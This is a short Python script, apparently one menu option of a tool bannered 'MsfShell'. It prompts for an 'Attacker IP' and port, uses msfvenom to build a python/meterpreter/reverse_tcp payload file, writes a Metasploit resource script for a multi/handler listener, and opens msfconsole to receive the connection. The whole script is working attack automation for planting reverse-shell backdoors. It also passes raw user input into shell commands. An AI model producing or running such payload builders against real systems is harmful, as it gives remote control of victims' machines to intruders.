import os

banner="""

 /'\_/`\          /'___\ 
/\      \    ____/\ \__/ 
\ \ \__\ \  /',__\ \ ,__|
 \ \ \_/\ \/\__, `\ \ \_/                 
  \ \_\\ \_\/\____/\ \_\ 
   \/_/ \/_/\/___/  \/_/ 

/\  _`\ /\ \            /\_ \  /\_ \     
\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
   /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ `\____\ \_\ \_\ \____\/\____\/\____|
    \/_____/\/_/\/_/\/____/\/____/\/____/

"""

def li_py():
    os.system("clear")
    print(banner)
    print("Using: python/meterpreter/reverse_tcp")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the python file: ")
    print("Ok!")
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: python/meterpreter/reverse_tcp")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p python/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" >> "+name+".py")
    print("Payload created! [01]")
    print("Saved in "+name+".py")
    print("Running metasploit-framework...")
    os.system("echo 'use exploit/multi/handler' >> python_tcp.rb")
    os.system("echo 'set LHOST "+ip+"' >> python_tcp.rb")
    os.system("echo 'set LPORT "+port+"' >> python_tcp.rb")
    os.system("echo 'set PAYLOAD python/meterpreter/reverse_tcp' >> python_tcp.rb")
    os.system("echo 'exploit' >> python_tcp.rb")
    os.system("gnome-terminal -- msfconsole -r python_tcp.rb &")
    input("Enter to return to the menu! ")

    os.system("clear")